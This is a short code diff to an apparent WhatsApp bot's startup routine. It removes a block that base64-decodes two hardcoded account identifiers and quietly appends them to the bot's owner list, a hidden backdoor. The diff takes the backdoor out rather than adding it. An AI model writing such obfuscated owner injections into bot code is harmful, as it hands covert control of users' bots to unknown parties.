@@ -234,18 +234,6 @@ async function startBot() {
                     global.owners.push(sock.user.id);
                 }
 
-                const abztech = [
-                    'MjE0MzAyMzI1NzYwMTU2QGxpZA==',
-                    'MjU3NzAyMzk5OTIwMzdAbGlk'
-                ];
-                    
-                const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
-                    
-                tech.forEach(owner => {
-                    if (!global.owners.includes(owner)) {
-                       global.owners.push(owner);
-                    }
-                });
 
                 try {
                     await sock.sendMessage(sock.user.id, {
